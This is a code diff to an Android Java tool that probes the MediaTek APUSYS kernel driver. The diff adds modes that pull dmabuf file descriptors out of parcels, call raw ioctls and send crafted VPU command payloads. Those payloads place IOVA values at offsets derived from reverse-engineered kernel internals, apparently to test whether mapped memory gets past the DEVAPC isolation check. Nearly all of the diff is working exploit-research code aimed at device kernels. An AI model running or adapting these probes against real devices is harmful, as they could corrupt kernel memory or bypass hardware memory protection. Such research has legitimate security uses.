@@ -45,6 +45,8 @@ public final class ApusysIoctlProbe {
     private static final int RUN_CMD_PAYLOAD_ZERO = 0;
     private static final int RUN_CMD_PAYLOAD_INVALID_SC = 1;
     private static final int RUN_CMD_PAYLOAD_VPU_GUARD = 2;
+    private static final int RUN_CMD_PAYLOAD_VPU_EXEC = 3;
+    private static final int RUN_CMD_PAYLOAD_VPU_IOVA = 4;
 
     private ApusysIoctlProbe() {
     }
@@ -62,6 +64,8 @@ public final class ApusysIoctlProbe {
         boolean runCmdHardwareBuffer = false;
         boolean runCmdInvalidSc = false;
         boolean runCmdVpuGuard = false;
+        boolean runCmdVpuExec = false;
+        boolean runCmdVpuIova = false;
         String ucmdKey = null;
         String ucmdKeyDump = null;
         for (String arg : args) {
@@ -89,6 +93,10 @@ public final class ApusysIoctlProbe {
                 runCmdInvalidSc = true;
             } else if ("--run-cmd-vpu-guard".equals(arg)) {
                 runCmdVpuGuard = true;
+            } else if ("--run-cmd-vpu-exec".equals(arg)) {
+                runCmdVpuExec = true;
+            } else if ("--run-cmd-vpu-iova".equals(arg)) {
+                runCmdVpuIova = true;
             } else if (arg.startsWith("--ucmd-key=")) {
                 ucmdKey = arg.substring("--ucmd-key=".length());
                 validateUcmdKey(ucmdKey);
@@ -104,6 +112,7 @@ public final class ApusysIoctlProbe {
         if (memNegative || devCtrl || memDmabuf || memIon || fdScan
                 || ucmdNegative || hardwareBuffer || ucmdHardwareBuffer
                 || runCmdHardwareBuffer || runCmdInvalidSc || runCmdVpuGuard
+                || runCmdVpuExec || runCmdVpuIova
                 || ucmdKey != null || ucmdKeyDump != null) {
             System.out.println("[*] Mode: optional checks enabled;"
                 + " no secure alloc/free, no real APUSYS workload\n");
@@ -189,6 +198,14 @@ public final class ApusysIoctlProbe {
 
             if (runCmdVpuGuard) {
                 runRunCmdVpuGuardHardwareBufferProbe(fd);
+            }
+
+            if (runCmdVpuExec) {
+                runRunCmdVpuExecHardwareBufferProbe(fd);
+            }
+
+            if (runCmdVpuIova) {
+                runRunCmdVpuIovaHardwareBufferProbe(fd);
             }
 
             if (ucmdKey != null) {
@@ -667,6 +684,236 @@ public final class ApusysIoctlProbe {
             RUN_CMD_PAYLOAD_VPU_GUARD);
     }
 
+    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd)
+            throws Exception {
+        System.out.println("\n[*] === Optional APUSYS run_cmd VPU IOVA chained probe ===");
+        System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
+            + " then VPU request references that IOVA in D2D buf descriptors."
+            + " Tests whether pre-mapped IOVA survives DEVAPC check.");
+
+        loadRuntimeLibraries();
+
+        android.media.ImageReader reader = null;
+        android.media.ImageWriter writer = null;
+        android.media.Image input = null;
+        android.media.Image output = null;
+        android.hardware.HardwareBuffer hb = null;
+        long memDesc = 0;
+        boolean memImported = false;
+        try {
+            reader = createRgbaImageReader(64, 64);
+            writer = android.media.ImageWriter.newInstance(reader.getSurface(), 2);
+            input = writer.dequeueInputImage();
+
+            // phase 1: write a zero payload first, just to get the HardwareBuffer fd
+            fillImageHeader(input, 0);
+            writer.queueInputImage(input);
+            input = null;
+
+            output = acquireImage(reader);
+            if (output == null) {
+                System.out.println("[-] ImageReader did not produce an output image");
+                return;
+            }
+            hb = output.getHardwareBuffer();
+            if (hb == null) {
+                System.out.println("[-] Image.getHardwareBuffer returned null");
+                return;
+            }
+
+            // phase 2: extract dmabuf fd from parcel at known offset 388
+            android.os.Parcel parcel = android.os.Parcel.obtain();
+            int dmaBufFd = -1;
+            try {
+                hb.writeToParcel(parcel, 0);
+                parcel.setDataPosition(388);
+                android.os.ParcelFileDescriptor pfd = parcel.readFileDescriptor();
+                if (pfd != null) {
+                    dmaBufFd = pfd.getFd();
+                }
+            } finally {
+                parcel.recycle();
+            }
+            if (dmaBufFd < 0) {
+                System.out.println("[-] Could not extract dmabuf fd from parcel pos 388");
+                return;
+            }
+            System.out.println("[+] dmabuf fd=" + dmaBufFd);
+
+            // phase 3: mem_create type-2 to import and get IOVA — do NOT free yet
+            memDesc = DrmTrigger.sScratchBuf + OFF_MEM_DMABUF;
+            DrmTrigger.zeroMem(memDesc, 0x38);
+            DrmTrigger.unsafePutInt(memDesc + 0x0c, 0x4000);  // size
+            DrmTrigger.unsafePutInt(memDesc + 0x18, 0);        // mem type
+            DrmTrigger.unsafePutInt(memDesc + 0x20, dmaBufFd); // fd
+
+            long memRet = DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_CREATE2, memDesc);
+            System.out.println("[*] mem_create2_iova cmd=0x"
+                + Long.toHexString(APUSYS_CMD_MEM_CREATE2)
+                + " ret=" + retText(memRet));
+            if (memRet < 0) {
+                System.out.println("[-] mem_create2 failed, cannot get IOVA");
+                return;
+            }
+            memImported = true;
+            dumpU32Words("mem_create2_iova_desc", memDesc, 0x38);
+
+            int iovaLow = DrmTrigger.unsafeGetInt(memDesc + 0x08);
+            int iovaSize = DrmTrigger.unsafeGetInt(memDesc + 0x0c);
+            long memId = DrmTrigger.unsafeGetLong(memDesc + 0x28);
+            System.out.println("[+] IOVA=0x" + Integer.toHexString(iovaLow)
+                + " size=0x" + Integer.toHexString(iovaSize)
+                + " mem_id=0x" + Long.toHexString(memId));
+
+            // phase 4: now build a second HardwareBuffer with the VPU+IOVA payload
+            output.close();
+            output = null;
+            hb.close();
+            hb = null;
+
+            android.media.ImageReader reader2 = createRgbaImageReader(64, 64);
+            android.media.ImageWriter writer2
+                = android.media.ImageWriter.newInstance(reader2.getSurface(), 2);
+            android.media.Image input2 = writer2.dequeueInputImage();
+            fillRunCmdVpuIova(input2, "apu_lib_apunn", "vpu_iova_apunn",
+                iovaLow, iovaSize);
+            writer2.queueInputImage(input2);
+
+            android.media.Image output2 = acquireImage(reader2);
+            if (output2 == null) {
+                System.out.println("[-] second ImageReader produced no image");
+                writer2.close();
+                reader2.close();
+                return;
+            }
+            android.hardware.HardwareBuffer hb2 = output2.getHardwareBuffer();
+            if (hb2 == null) {
+                System.out.println("[-] second HardwareBuffer is null");
+                output2.close();
+                writer2.close();
+                reader2.close();
+                return;
+            }
+
+            // phase 5: extract fd and run_cmd_async with IOVA-referencing payload
+            android.os.Parcel p2 = android.os.Parcel.obtain();
+            int cmdFd = -1;
+            try {
+                hb2.writeToParcel(p2, 0);
+                p2.setDataPosition(388);
+                android.os.ParcelFileDescriptor pfd2 = p2.readFileDescriptor();
+                if (pfd2 != null) {
+                    cmdFd = pfd2.getFd();
+                }
+            } finally {
+                p2.recycle();
+            }
+            if (cmdFd < 0) {
+                System.out.println("[-] Could not extract cmd dmabuf fd");
+                hb2.close();
+                output2.close();
+                writer2.close();
+                reader2.close();
+                return;
+            }
+            System.out.println("[+] cmd dmabuf fd=" + cmdFd);
+
+            // mem_create for the cmd buffer itself
+            long cmdMemDesc = DrmTrigger.sScratchBuf + OFF_MEM_B;
+            DrmTrigger.zeroMem(cmdMemDesc, 0x38);
+            DrmTrigger.unsafePutInt(cmdMemDesc + 0x0c, 0x4000);
+            DrmTrigger.unsafePutInt(cmdMemDesc + 0x18, 0);
+            DrmTrigger.unsafePutInt(cmdMemDesc + 0x20, cmdFd);
+            long cmdMemRet = DrmTrigger.rawIoctl(apusysFd,
+                APUSYS_CMD_MEM_CREATE2, cmdMemDesc);
+            System.out.println("[*] mem_create2_cmd cmd=0x"
+                + Long.toHexString(APUSYS_CMD_MEM_CREATE2)
+                + " ret=" + retText(cmdMemRet));
+            if (cmdMemRet < 0) {
+                System.out.println("[-] cmd mem_create2 failed");
+                hb2.close();
+                output2.close();
+                writer2.close();
+                reader2.close();
+                return;
+            }
+            dumpU32Words("mem_create2_cmd_desc", cmdMemDesc, 0x38);
+
+            // run_cmd_async
+            long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
+            DrmTrigger.zeroMem(runCmd, 0x18);
+            DrmTrigger.unsafePutInt(runCmd + 0x08, cmdFd);
+            DrmTrigger.unsafePutInt(runCmd + 0x10, 0x4000);
+            long runRet = DrmTrigger.rawIoctl(apusysFd,
+                APUSYS_CMD_RUN_ASYNC, runCmd);
+            System.out.println("[*] run_async_vpu_iova cmd=0x"
+                + Long.toHexString(APUSYS_CMD_RUN_ASYNC)
+                + " ret=" + retText(runRet));
+
+            // wait a bit for VPU timeout / completion
+            System.out.println("[*] Waiting 3s for VPU execution/timeout...");
+            Thread.sleep(3000);
+
+            // dump the IOVA buffer to see if VPU wrote anything back
+            // re-read the first HardwareBuffer's dmabuf content via a fresh Image
+            System.out.println("[*] Dumping IOVA buffer post-execution:");
+            android.media.ImageReader reader3 = createRgbaImageReader(64, 64);
+            android.media.ImageWriter writer3
+                = android.media.ImageWriter.newInstance(reader3.getSurface(), 2);
+            android.media.Image input3 = writer3.dequeueInputImage();
+            fillImageHeader(input3, 0x41414141);
+            writer3.queueInputImage(input3);
+            android.media.Image output3 = acquireImage(reader3);
+            if (output3 != null) {
+                android.media.Image.Plane[] planes = output3.getPlanes();
+                if (planes != null && planes.length > 0) {
+                    java.nio.ByteBuffer buf = planes[0].getBuffer();
+                    dumpByteBuffer("post_exec_buf", buf, 0x80);
+                }
+                output3.close();
+            }
+            writer3.close();
+            reader3.close();
+
+            // cleanup cmd mem
+            DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_FREE_02, cmdMemDesc);
+            System.out.println("[*] cmd mem_create2 freed");
+
+            hb2.close();
+            output2.close();
+            writer2.close();
+            reader2.close();
+
+        } finally {
+            // phase 6: cleanup IOVA mem
+            if (memImported) {
+                DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_FREE_02, memDesc);
+                System.out.println("[*] IOVA mem_create2 freed");
+            }
+            if (hb != null) hb.close();
+            if (output != null) output.close();
+            if (input != null) input.close();
+            if (writer != null) writer.close();
+            if (reader != null) reader.close();
+        }
+    }
+
+    private static void runRunCmdVpuExecHardwareBufferProbe(int apusysFd)
+            throws Exception {
+        System.out.println("\n[*] === Optional APUSYS run_cmd VPU full-size exec probe ===");
+        System.out.println("[*] Mode: valid APUSYS command header, normal VPU"
+            + " subcommand type, 0xb70 codebuf with apu_lib_apunn algo name,"
+            + " flags=0, priority=0. Expects real VPU hw dispatch or timeout.");
+
+        loadRuntimeLibraries();
+        dumpClassShape("android.hardware.HardwareBuffer");
+        dumpClassShape("android.media.ImageReader");
+        dumpClassShape("android.media.ImageWriter");
+
+        runOneRunCmdHardwareBufferProbe(apusysFd, "vpu_exec_apunn", 0,
+            RUN_CMD_PAYLOAD_VPU_EXEC);
+    }
+
     private static void runOneRunCmdHardwareBufferProbe(int apusysFd, String label,
                                                         int firstU32) throws Exception {
         runOneRunCmdHardwareBufferProbe(apusysFd, label, firstU32,
@@ -709,6 +956,9 @@ public final class ApusysIoctlProbe {
             } else if (payloadMode == RUN_CMD_PAYLOAD_VPU_GUARD) {
                 fillRunCmdSubcommand(input, 0x03, 0x20, 0x60,
                     "vpu_guard_type3_size20");
+            } else if (payloadMode == RUN_CMD_PAYLOAD_VPU_EXEC) {
+                fillRunCmdVpuExec(input, "apu_lib_apunn",
+                    "vpu_exec_apunn");
             } else {
                 fillImageHeader(input, firstU32);
             }
@@ -809,6 +1059,132 @@ public final class ApusysIoctlProbe {
             + " pixelStride=" + planes[0].getPixelStride());
     }
 
+    private static void fillRunCmdVpuIova(android.media.Image image,
+                                          String algoName,
+                                          String label,
+                                          int iovaAddr,
+                                          int iovaSize) throws Exception {
+        android.media.Image.Plane[] planes = image.getPlanes();
+        if (planes == null || planes.length == 0) {
+            throw new IllegalStateException("input image has no planes");
+        }
+        java.nio.ByteBuffer buffer = planes[0].getBuffer();
+        int clearLen = buffer.capacity() < 0x2000 ? buffer.capacity() : 0x2000;
+        for (int i = 0; i < clearLen; i++) {
+            buffer.put(i, (byte) 0);
+        }
+
+        int codebufOffset = 0x60;
+        int codebufSize = 0xb70;
+        int totalNeeded = codebufOffset + codebufSize;
+        if (buffer.capacity() < totalNeeded) {
+            throw new IllegalStateException("input image too small: need 0x"
+                + Integer.toHexString(totalNeeded) + " have "
+                + buffer.capacity());
+        }
+
+        // APUSYS command header — same as fillRunCmdVpuExec
+        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
+        buffer.put(0x10, (byte) 1);       // version
+        buffer.put(0x11, (byte) 0);       // priority
+        putU64LE(buffer, 0x18, 0);        // flags
+        putU32LE(buffer, 0x20, 1);        // num_sc
+        putU32LE(buffer, 0x24, 0x5c);     // ofs_scr_list
+        putU32LE(buffer, 0x28, 0x58);     // ofs_pdr_cnt_list
+        putU32LE(buffer, 0x2c, 0x30);     // sc0 offset
+
+        // Subcommand at 0x30 — normal VPU type
+        int scOff = 0x30;
+        putU32LE(buffer, scOff + 0x00, 0x03);  // type = normal VPU
+        putU32LE(buffer, scOff + 0x20, codebufSize);     // cb_info_size
+        putU32LE(buffer, scOff + 0x24, codebufOffset);   // ofs_cb_info
+        putU32LE(buffer, 0x58, 0);        // pdr_cnt_list[0]
+        putU32LE(buffer, 0x5c, 0);        // scr_list[0]
+
+        // VPU request at codebufOffset (0x60): 0xb70 bytes
+        int reqBase = codebufOffset;
+
+        // +0x04: algo name
+        byte[] nameBytes = algoName.getBytes("US-ASCII");
+        int nameLen = nameBytes.length < 0x1f ? nameBytes.length : 0x1f;
+        for (int i = 0; i < nameLen; i++) {
+            buffer.put(reqBase + 0x04 + i, nameBytes[i]);
+        }
+
+        // +0x28: flags = 0 (walk vpu_execute, not vpu_execute_with_slot)
+        // +0x35: priority = 0
+
+        // +0x38: sett_ptr — VPU d2d uses this as algo settings IOVA
+        putU32LE(buffer, reqBase + 0x38, iovaAddr);
+
+        // +0x40: sett_length
+        putU32LE(buffer, reqBase + 0x40, iovaSize);
+
+        // +0x50: D2D buffer descriptor array
+        // The kernel copies +0x50 region (up to priority<<6 bytes) to a slot
+        // descriptor, then passes it to IOMMU map callback.
+        // Each buf descriptor in the VPU D2D region is 0xB0 bytes per slot.
+        // Within the slot descriptor at +0x3E0 in core struct:
+        //   +0x28 = iova address, +0x30 = size (used by iommu map callback)
+        // But the copy is from request+0x50 with length = priority << 6.
+        // With priority=0, length=0 — no D2D buffers.
+        // Set priority=1 to copy 0x40 bytes from +0x50 into the slot desc.
+        buffer.put(reqBase + 0x35, (byte) 1);  // priority = 1
+
+        // D2D buf descriptor at reqBase+0x50, mapped into slot desc structure:
+        // The slot desc used by iommu map callback reads:
+        //   +0x28 = IOVA, +0x30 = size
+        // So we place IOVA at request+0x50+0x28 = request+0x78
+        // and size at request+0x50+0x30 = request+0x80
+        // But first 0x18 bytes of slot are header, so buf array starts at
+        // slot+0x18. Actually, the memcpy source is X2=req+0x50, length = pri<<6.
+        // The dest is core+slot*0xB0+0x3E0. Then sub_FFFFFFC0087A86D0 is
+        // called with X1 = dest area (which is &slot_desc at core+0x3E0).
+        // sub_FFFFFFC0087A86D0 reads [X1+0x28] as IOVA, [X1+0x30] as size.
+        // So the memcpy copies req+0x50..req+0x50+0x40 to the slot desc area.
+        // We need IOVA at offset 0x28 within that copied region,
+        // which is req+0x50+0x28 = req+0x78 (absolute offset from req base).
+        putU32LE(buffer, reqBase + 0x50 + 0x28, iovaAddr);
+        putU32LE(buffer, reqBase + 0x50 + 0x30, iovaSize);
+
+        // Also try the sett_ptr field at +0x38/+0x40 — these get written
+        // to MMIO core+0x288 and core+0x28C by the execution function.
+        // Already set above.
+
+        image.setTimestamp(System.nanoTime());
+        System.out.println("[+] input run_cmd " + label + " payload:"
+            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
+            + " sc0_off=0x30 sc0_type=0x3"
+            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
+            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
+            + " algo=" + algoName
+            + " req_prio=1"
+            + " iova=0x" + Integer.toHexString(iovaAddr)
+            + " iova_size=0x" + Integer.toHexString(iovaSize)
+            + " d2d_buf_iova_at=0x" + Integer.toHexString(reqBase + 0x50 + 0x28)
+            + " sett_iova_at=0x" + Integer.toHexString(reqBase + 0x38)
+            + " plane_count=" + planes.length
+            + " cap=" + buffer.capacity()
+            + " rowStride=" + planes[0].getRowStride()
+            + " pixelStride=" + planes[0].getPixelStride());
+    }
+
+    private static void dumpByteBuffer(String name, java.nio.ByteBuffer buf,
+                                        int len) {
+        int actual = buf.capacity() < len ? buf.capacity() : len;
+        StringBuilder sb = new StringBuilder();
+        sb.append("    ").append(name).append(":");
+        for (int i = 0; i < actual; i += 4) {
+            int val = (buf.get(i) & 0xff)
+                | ((buf.get(i + 1) & 0xff) << 8)
+                | ((buf.get(i + 2) & 0xff) << 16)
+                | ((buf.get(i + 3) & 0xff) << 24);
+            sb.append(" [").append(i).append("]=0x")
+              .append(Integer.toHexString(val));
+        }
+        System.out.println(sb.toString());
+    }
+
     private static void fillRunCmdSubcommand(android.media.Image image,
                                              int scType,
                                              int codebufSize,
@@ -851,6 +1227,82 @@ public final class ApusysIoctlProbe {
             + " cb_info_size=0x" + Integer.toHexString(codebufSize)
             + " pdr_cnt_off=0x58 scr_off=0x5c"
             + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
+            + " plane_count=" + planes.length
+            + " cap=" + buffer.capacity()
+            + " rowStride=" + planes[0].getRowStride()
+            + " pixelStride=" + planes[0].getPixelStride());
+    }
+
+    private static void fillRunCmdVpuExec(android.media.Image image,
+                                          String algoName,
+                                          String label) throws Exception {
+        android.media.Image.Plane[] planes = image.getPlanes();
+        if (planes == null || planes.length == 0) {
+            throw new IllegalStateException("input image has no planes");
+        }
+        java.nio.ByteBuffer buffer = planes[0].getBuffer();
+        int clearLen = buffer.capacity() < 0x2000 ? buffer.capacity() : 0x2000;
+        for (int i = 0; i < clearLen; i++) {
+            buffer.put(i, (byte) 0);
+        }
+
+        int codebufOffset = 0x60;
+        int codebufSize = 0xb70;
+        int totalNeeded = codebufOffset + codebufSize;
+        if (buffer.capacity() < totalNeeded) {
+            throw new IllegalStateException("input image too small: need 0x"
+                + Integer.toHexString(totalNeeded) + " have "
+                + buffer.capacity());
+        }
+
+        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
+        buffer.put(0x10, (byte) 1);       // version
+        buffer.put(0x11, (byte) 0);       // priority
+        putU64LE(buffer, 0x18, 0);        // flags
+        putU32LE(buffer, 0x20, 1);        // num_sc
+        putU32LE(buffer, 0x24, 0x5c);     // ofs_scr_list
+        putU32LE(buffer, 0x28, 0x58);     // ofs_pdr_cnt_list
+        putU32LE(buffer, 0x2c, 0x30);     // sc0 offset
+
+        int scOff = 0x30;
+        putU32LE(buffer, scOff + 0x00, 0x03);  // type = normal VPU
+        putU32LE(buffer, scOff + 0x04, 0);     // driver_time
+        putU32LE(buffer, scOff + 0x08, 0);     // ip_time
+        putU32LE(buffer, scOff + 0x0c, 0);     // suggest_time
+        putU32LE(buffer, scOff + 0x10, 0);     // bandwidth
+        putU32LE(buffer, scOff + 0x14, 0);     // tcm_usage
+        buffer.put(scOff + 0x18, (byte) 0);    // tcm_force
+        buffer.put(scOff + 0x19, (byte) 0);    // boost_val
+        buffer.put(scOff + 0x1a, (byte) 0);    // pack_id
+        putU32LE(buffer, scOff + 0x1c, 0);     // mem_ctx
+        putU32LE(buffer, scOff + 0x20, codebufSize);     // cb_info_size
+        putU32LE(buffer, scOff + 0x24, codebufOffset);   // ofs_cb_info
+        putU32LE(buffer, 0x58, 0);        // pdr_cnt_list[0]
+        putU32LE(buffer, 0x5c, 0);        // scr_list[0]
+
+        // VPU request at codebufOffset (0x60): 0xb70 bytes
+        // +0x04: algo name (NUL-terminated, up to 0x1f bytes)
+        // +0x28: flags (u64), must be < 0x10; bit 2 selects execute_with_slot
+        // +0x35: priority byte, must be < 0x21
+        // rest zeroed — minimal request to pass vpu_req_check
+        int reqBase = codebufOffset;
+        byte[] nameBytes = algoName.getBytes("US-ASCII");
+        int nameLen = nameBytes.length < 0x1f ? nameBytes.length : 0x1f;
+        for (int i = 0; i < nameLen; i++) {
+            buffer.put(reqBase + 0x04 + i, nameBytes[i]);
+        }
+        // +0x28 flags = 0 (walk vpu_execute, not vpu_execute_with_slot)
+        // +0x35 priority = 0
+        // all other fields stay zero
+
+        image.setTimestamp(System.nanoTime());
+        System.out.println("[+] input run_cmd " + label + " payload:"
+            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
+            + " sc0_off=0x30 sc0_type=0x3"
+            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
+            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
+            + " algo=" + algoName
+            + " req_flags=0x0 req_prio=0"
             + " plane_count=" + planes.length
             + " cap=" + buffer.capacity()
             + " rowStride=" + planes[0].getRowStride()
